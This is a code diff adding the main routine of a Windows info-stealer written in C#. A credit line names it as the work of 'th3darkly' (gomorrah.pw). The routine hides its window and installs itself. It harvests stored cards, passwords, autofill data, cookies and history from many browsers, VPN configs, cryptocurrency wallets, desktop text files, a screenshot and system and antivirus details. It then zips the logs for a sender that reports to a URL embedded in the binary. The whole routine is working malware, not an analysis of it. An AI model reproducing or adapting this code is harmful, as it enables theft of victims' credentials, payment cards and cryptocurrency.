@@ -1,0 +1,147 @@
+private void main_Load(object sender, EventArgs e)
+		{
+			try
+			{
+				Control.CheckForIllegalCrossThreadCalls = false;
+				try
+				{
+					FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
+					string expression = Strings.Space(checked((int)FileSystem.LOF(1)));
+					FileSystem.FileGet(1, ref expression, -1L, false);
+					FileSystem.FileClose(new int[]
+					{
+						1
+					});
+					string[] array = Strings.Split(expression, "|FS|", -1, CompareMethod.Binary);
+					this.urlbot = array[1];
+				}
+				catch (Exception ex)
+				{
+				}
+				byte[] newtonsoft_Json = Resources.Newtonsoft_Json;
+				FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\Newtonsoft.Json.dll", OpenMode.Binary, OpenAccess.Default, OpenShare.Default, -1);
+				FileSystem.FilePut(1, newtonsoft_Json, -1L, false, false);
+				FileSystem.FileClose(new int[]
+				{
+					1
+				});
+				byte[] newtonsoft_Json2 = Resources.Newtonsoft_Json;
+				FileSystem.FileOpen(1, "Newtonsoft.Json.dll", OpenMode.Binary, OpenAccess.Default, OpenShare.Default, -1);
+				FileSystem.FilePut(1, newtonsoft_Json2, -1L, false, false);
+				FileSystem.FileClose(new int[]
+				{
+					1
+				});
+				Mutex mutex = new Mutex(false, Application.ProductName);
+				bool flag = !mutex.WaitOne(0, false);
+				bool flag2 = flag;
+				if (flag2)
+				{
+					Application.ExitThread();
+					return;
+				}
+				this.Install_server();
+				Thread.Sleep(1300);
+				this.Hide();
+				this.Opacity = 0.0;
+				this.ShowInTaskbar = false;
+				object countryCode = this.get_countryCode();
+				flag2 = MyProject.Computer.FileSystem.DirectoryExists(config.logs_dir);
+				if (!flag2)
+				{
+					MyProject.Computer.FileSystem.CreateDirectory(config.logs_dir);
+					MyProject.Computer.FileSystem.CreateDirectory(config.browser_log);
+					MyProject.Computer.FileSystem.CreateDirectory(config.wallet_log);
+					MyProject.Computer.FileSystem.CreateDirectory(config.File_log);
+					MyProject.Computer.FileSystem.CreateDirectory(config.VPN_log);
+				}
+			}
+			catch (Exception ex2)
+			{
+			}
+			ProcessList.getprosess();
+			ProgramList.getprogramlist();
+			Thread.Sleep(100);
+			this.Run();
+			Cards.get_cc_Google();
+			Cards.get_cc_Brave();
+			Cards.get_cc_Orbitum();
+			Cards.get_cc_Amigo();
+			Cards.get_cc_Torch();
+			Cards.get_cc_Yandex();
+			Cards.get_cc_Comodo();
+			Cards.get_cc_Kometa();
+			Autofull.get_Autofull_Google();
+			Autofull.get_Autofull_Brave();
+			Autofull.get_Autofull_Yandex();
+			Autofull.get_Autofull_Comodo();
+			Autofull.get_Autofull_Kometa();
+			Autofull.get_Autofull_Orbitum();
+			Autofull.get_Autofull_Amigo();
+			Autofull.get_Autofull_Torch();
+			File.WriteAllText(config.logs_dir + "\\Cards.txt", this.TextBox1.Text);
+			File.WriteAllText(Path.Combine(new string[]
+			{
+				config.logs_dir + "\\Passwords.txt"
+			}), this.TextBox2.Text);
+			cookies.get_Cookie_Google();
+			cookies.get_Cookie_Brave();
+			cookies.get_Cookie_Yandex();
+			cookies.get_Cookie_Comodo();
+			cookies.get_Cookie_Kometa();
+			cookies.get_Cookie_Orbitum();
+			cookies.get_Cookie_Amigo();
+			cookies.get_Cookie_Torch();
+			History.get_History_Google();
+			History.get_History_Brave();
+			History.get_History_Yandex();
+			History.get_History_Comodo();
+			History.get_History_Kometa();
+			History.get_History_Orbitum();
+			History.get_History_Amigo();
+			History.get_History_Torch();
+			ProtonVPN.Save();
+			OpenVPN.Save();
+			Crypto.BitcoinCore();
+			Crypto.Armory();
+			Crypto.Electrum();
+			Crypto.EcoinStr();
+			Crypto.Zcash();
+			Crypto.DashCore();
+			Crypto.XMRcoinStr(config.wallet_log);
+			Functions.screenshot();
+			File.WriteAllText(config.info_pc, "");
+			StreamWriter streamWriter = new StreamWriter(config.info_pc, true);
+			streamWriter.Write(string.Concat(new string[]
+			{
+				"PC Name : ",
+				Dns.GetHostName(),
+				"\r\nOperating System : ",
+				info.GetOS(),
+				"\r\nAnti virus : ",
+				info.GetAntivirus(),
+				"\r\nFirewall : ",
+				info.GetFirewall(),
+				"\r\nProcessor : ",
+				info.GetProcessor(),
+				"\r\nMemory (RAM) : ",
+				info.GetMemory(),
+				"\r\n-----------------------------------------------------------------------\r\n-------------Developed By th3darkly [ https://gomorrah.pw ]-------------"
+			}));
+			streamWriter.Close();
+			Files.grab_TXT_from_desktop(config.File_log);
+			Thread.Sleep(300);
+			byte[] zip = Resources.Zip;
+			FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\Zip.exe", OpenMode.Binary, OpenAccess.Default, OpenShare.Default, -1);
+			FileSystem.FilePut(1, zip, -1L, false, false);
+			FileSystem.FileClose(new int[]
+			{
+				1
+			});
+			this.zip_plugin();
+			Thread.Sleep(1000);
+			this.Timer1.Start();
+			this.task_checker.Start();
+			this.clear_logs.Start();
+			this.checker_sender.Start();
+		}
